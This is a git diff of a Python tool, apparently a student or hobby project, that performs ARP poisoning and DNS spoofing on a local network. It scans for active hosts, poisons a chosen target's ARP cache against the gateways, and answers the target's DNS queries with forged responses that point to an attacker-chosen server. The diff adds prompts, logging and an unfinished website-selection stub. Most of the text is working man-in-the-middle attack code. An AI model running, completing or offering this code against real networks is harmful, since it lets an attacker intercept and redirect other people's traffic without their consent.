@@ -20,16 +20,16 @@ def dns_spoofing():
 
     iface = fpc.get_interface()
 
-    spoof.printf("Searching for active hosts in the subnet...", 4)
+    spoof.printf("Searching for active hosts in the subnet...")
     spoof.printf("")
     active_hosts = sh.search_hosts(iface)
 
     spoof.printf("")
-    spoof.printf("Input the IP address of the target out of the active hosts:", 1)
+    spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
     target = fpc.validate_ip(active_hosts, "")
 
     spoof.printf("")
-    spoof.printf("Input the IP address of the server out of the active hosts:", 1)
+    spoof.printf("Input the IP address of the server out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
     server = fpc.validate_ip(active_hosts, target["ip"])
 
     # Get the IP addresses of the default gateways of the selected interface
@@ -38,17 +38,28 @@ def dns_spoofing():
         if val[1] == iface:
             gateways.append(val)
 
+    choose_websites(active_hosts)
+
+    spoof.printf("")
     spoof.printf("Starting poisoning...", 4)
     # Start ARP poisoning
     my_addresses = sh.get_my_details(iface)
     for gw_ip, gw_iface in gateways:
         arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)
 
-    spoof.printf("Poisoning initiated.")
+    spoof.printf("Poisoning initiated.", 4)
 
     dns_spoof_and_repoison(my_addresses, gateways, target, server, iface)
 
     # TODO stop arp poisoning
+
+def choose_websites(active_hosts):
+    #spoof.clear()
+    spoof.printf("Now you can choose which websites to spoof and with what IP where the IP is out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"). You can pick multiple times and stop choosing by pressing 's'.")
+    
+    while True:
+        spoof.printf("Choose website to spoof and its corresponding IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
+        break
 
 def dns_spoof_and_repoison(my_addresses, gateways, target, server, iface):
     last_poison_time = time.time() - REPOISON_TIME
@@ -65,13 +76,14 @@ def dns_spoof_and_repoison(my_addresses, gateways, target, server, iface):
             last_poison_time = current_time
 
 def repoison(my_addresses, gateways, target, iface):
-    spoof.printf("Repoisoning")
+    spoof.printf("Repoisoning", 4)
     for gw_ip, gw_iface in gateways:
         arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2)
 
 def process_udp_pkt(target, server, iface):
     def process_udp_pkt_inside(pkt): 
         if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
+            spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
             resp_packet = build_dns_response_packet(pkt, server["ip"])
             sendp(resp_packet, iface=iface)
         else: 
